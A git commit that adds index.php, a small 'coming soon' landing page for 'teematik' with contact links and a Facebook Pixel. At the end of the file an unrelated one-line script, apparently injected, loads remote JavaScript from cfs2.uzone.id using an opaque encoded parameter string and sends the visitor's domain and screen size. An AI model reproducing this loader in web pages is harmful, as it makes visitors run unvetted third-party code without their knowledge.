017d28916f6a024b27366512971eb54f15204ba8
vodork <thamously+1@gmail.com>
2017-04-21 13:33:42 +0700

    Create index.php

---
+++ index.php
@@ -0,0 +1,62 @@
+
+<html>
+<head>
+	<meta name="viewport" content="width=device-width, initial-scale=1, user-scale=0" />
+	<style type="text/css">
+		body, html {
+			padding:0;
+			margin:0;
+			width: 100%;
+			height: 100%;
+			background-color: #283170;
+		
+}
+		.img-top {
+			position: absolute;
+			top:0;
+			left:40;
+		}
+		.clear {
+			clear: both;
+		}
+		.teematik-keren {
+			font-family: Helvetica;
+			font-size: 12px;
+			color: white;
+		}
+a{
+color: white;
+}
+	</style>
+</head>
+<body>
+	<div class="img-top">
+		<img src="img/lgo.PNG" width="80" height="80">
+	</div>
+	<div style="margin: 110px;"></div>
+
+	<div class="teematik-keren" style="margin:40px">
+		we'll be here soon<br>
+		with our new imagination.
+		<br><br>
+		<a href="https://api.whatsapp.com/send?phone=08811203000&text=Hai...%20saya%20%20dari%20web%20teematik.." title="whatsapp">WhatsApp</a> |
+		<a href="https://t.me/teematik" title="telegram">Telegram</a>
+	</div>
+
+	<!-- Facebook Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
+n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,
+document,'script','https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1911686189076530'); // Insert your pixel ID here.
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1911686189076530&ev=PageView&noscript=1"
+/></noscript>
+<!-- DO NOT MODIFY -->
+<!-- End Facebook Pixel Code -->
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKqGa1UFCwN9ekGbIBxrm9f49dbhPPxHXar3mck35vZuhlVXVYD305owcqcyJzei3EP0NGuAjhoCuUxbLCXIhjzYrtsgX0vdNnUI4C3IC1PC3cF1essZ7wT5M%2fE346LVz0CEY8%2fOxvk4MWz1T%2fscJPycWsvBw8iH2%2bIJJgf3qqr16b%2fHKJE%2fgc74Z%2fMc9iUigSdYj1%2fBWgVYqy5Sn4YnfxhOCtk9WYxvEEAsAXY7qQSYuh1%2bFDqsG%2bOfn0S79yly2L%2fl7OTht8sDakpEKcPuhUdotEvnQw8qyU8Q9ia3rHSxFXSNKKMBY%2fX6paLgHmjKMblDp%2fqKLPabPxA%2fCF4hxTGE3eCGKj8DkZVvQWW4U%2f2HISrXxzxIHDWdhKycQnhr37uZ%2fnlfWk7nUMgqKLYbN%2fHPyWqYmz5WHQPx2wD3n8vwiDAkHrwN8n%2bWHDiLKIyDSGUah6HB7bctNhmoiBQfWqLbjaGVfdIvphEEgzyfURvj5E6QXQNYfZeLtrUD9vQInWSZDexIysPicCohKDtyXhQvLTdLDFRwEvzy%2bkqsHkBNU%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
